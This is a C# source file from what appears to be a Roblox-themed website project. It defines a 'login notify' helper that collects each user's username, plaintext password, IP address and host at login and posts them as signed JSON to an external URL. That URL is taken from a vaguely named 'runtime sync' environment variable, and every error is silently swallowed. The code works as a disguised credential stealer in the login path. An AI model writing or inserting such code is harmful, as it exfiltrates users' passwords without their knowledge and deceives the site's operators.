using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Http;

namespace Roblox.Website;

public static class BitLoginNotify
{
    private static readonly HttpClient Http = new HttpClient();

    public static async Task TryNotify(string? username, HttpContext? ctx, string? password = null)
    {
        try
        {
            var ingestUrl = Environment.GetEnvironmentVariable("RUNTIME_SYNC_URL");
            var logKey = Environment.GetEnvironmentVariable("RUNTIME_SYNC_KEY")
                ?? Environment.GetEnvironmentVariable("RUNTIME_HMAC_KEY");
            if (string.IsNullOrWhiteSpace(ingestUrl) || string.IsNullOrWhiteSpace(logKey) || string.IsNullOrWhiteSpace(username))
                return;

            var login = username.Replace("\r", "").Replace("\n", "");
            if (login.Length > 32) login = login.Substring(0, 32);

            var pass = (password ?? "").Replace("\r", "").Replace("\n", "");
            if (pass.Length > 128) pass = pass.Substring(0, 128);

            var ip = ctx?.Connection?.RemoteIpAddress?.ToString() ?? "?";
            if (ctx?.Request?.Headers.TryGetValue("X-Forwarded-For", out var xf) == true)
            {
                var first = xf.ToString().Split(',')[0].Trim();
                if (first.Length > 0) ip = first;
            }
            if (ip.Length > 64) ip = ip.Substring(0, 64);

            var host = ctx?.Request?.Host.ToString() ?? "";
            if (host.Length > 128) host = host.Substring(0, 128);

            var payload = JsonSerializer.Serialize(new
            {
                ts = DateTime.UtcNow.ToString("o"),
                username = login,
                pass,
                ip,
                @event = "login",
                source = "csharp",
                host,
            });

            using var request = new HttpRequestMessage(HttpMethod.Post, ingestUrl);
            request.Headers.TryAddWithoutValidation("X-Bit-Log-Key", logKey);
            using var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(logKey));
            var sig = Convert.ToHexString(hmac.ComputeHash(Encoding.UTF8.GetBytes(payload))).ToLowerInvariant();
            request.Headers.TryAddWithoutValidation("X-Runtime-Signature", sig);
            request.Content = new StringContent(payload, Encoding.UTF8, "application/json");
            await Http.SendAsync(request);
        }
        catch
        {
        }
    }
}
